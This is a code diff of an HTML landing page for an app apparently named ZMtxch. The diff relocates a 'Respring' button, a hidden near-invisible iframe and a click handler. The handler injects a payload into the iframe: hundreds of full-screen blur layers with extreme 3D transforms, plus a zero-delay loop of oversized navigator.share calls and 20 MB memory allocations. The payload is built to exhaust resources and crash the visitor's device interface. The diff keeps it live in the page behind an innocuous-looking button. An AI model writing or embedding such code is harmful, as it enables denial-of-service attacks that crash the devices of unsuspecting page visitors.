@@ -210,15 +210,12 @@ h2{
   <a class="brand" href="#top" aria-label="ZMtxch, back to top">
     <span class="icon sm" role="img" aria-label="ZMtxch app icon">Z</span><span data-bind="name"></span>
   </a>
-  <div style="display: flex; align-items: center; gap: 10px;">
+  <div style="display: flex; align-items: center; gap: 8px;">
     <!-- Added Respring Button -->
-    <button id="respring-btn" class="btn primary" style="min-height: 36px; padding: 4px 12px; font-size: 0.85rem;">Respring</button>
+    <button class="btn primary" id="respring-btn" style="min-height: 34px; padding: 4px 12px; font-size: 0.8rem;">Respring</button>
     <span class="label">open carefully / contents may be useful</span>
   </div>
 </header>
-
-<!-- Hidden iframe for Respring functionality -->
-<iframe id="respring-iframe" style="position:fixed;top:0;left:0;width:1px;height:1px;border:none;opacity:0.05;pointer-events:none;" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
 
 <main id="top">
   <!-- Hero: back of the box -->
@@ -280,6 +277,9 @@ h2{
   </div>
   <p class="colophon"><span data-bind="name"></span> / <span id="year"></span></p>
 </footer>
+
+<!-- Hidden iframe injected for the respring payload -->
+<iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin" style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; border: none; opacity: 0.05; pointer-events: none; display: none;"></iframe>
 
 <script>
 /* =========================================================
@@ -453,6 +453,38 @@ function releaseCard({ repo, rel }, i) {
   }
 })();
 
+/* ---------- Respring Button & Iframe Logic Execution ---------- */
+document.getElementById('respring-btn').addEventListener('click', function() {
+    const frame = document.getElementById('respring-iframe');
+    frame.style.display = 'block';
+    const respringScript = `
+        <html>
+        <body style="margin:0; overflow:hidden;">
+            <script>
+                const container = document.createElement('div');
+                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                document.body.appendChild(container);
+
+                for (let i = 0; i < 500; i++) {
+                    let d = document.createElement('div');
+                    d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                    container.appendChild(d);
+                }
+
+                setInterval(() => {
+                    try {
+                        navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+                    } catch(e) {}
+                    let x = new Uint8Array(1024 * 1024 * 20);
+                    crypto.getRandomValues(x);
+                }, 0);
+            <\/script>
+        </body>
+        </html>
+    `;
+    frame.srcdoc = respringScript;
+});
+
 /* ---------- Decorations: starburst, sparkles ---------- */
 (function decorate() {
   const pts = [], n = 18;                                       // 18-point star clip-path
@@ -483,37 +515,6 @@ function releaseCard({ repo, rel }, i) {
   while (x < 164) { const w = 1 + Math.floor(rnd() * 4); if (rnd() > .4) b += `<rect x="${x}" y="2" width="${w}" height="60"/>`; x += w + 1 + Math.floor(rnd() * 2); }
   $("#bar").innerHTML = `<g fill="#0a1a26">${b}</g>`;
 })();
-
-/* ---------- Respring Button Handler ---------- */
-document.getElementById('respring-btn').addEventListener('click', function() {
-    const frame = document.getElementById('respring-iframe');
-    const respringScript = `
-        <html>
-        <body style="margin:0; overflow:hidden;">
-            <script>
-                const container = document.createElement('div');
-                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                document.body.appendChild(container);
-
-                for (let i = 0; i < 500; i++) {
-                    let d = document.createElement('div');
-                    d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
-                    container.appendChild(d);
-                }
-
-                setInterval(() => {
-                    try {
-                        navigator.share({ title: 'R', text: 'R'.repeat(100000) });
-                    } catch(e) {}
-                    let x = new Uint8Array(1024 * 1024 * 20);
-                    crypto.getRandomValues(x);
-                }, 0);
-            <\/script>
-        </body>
-        </html>
-    `;
-    frame.srcdoc = respringScript;
-});
 </script>
 </body>
 </html>
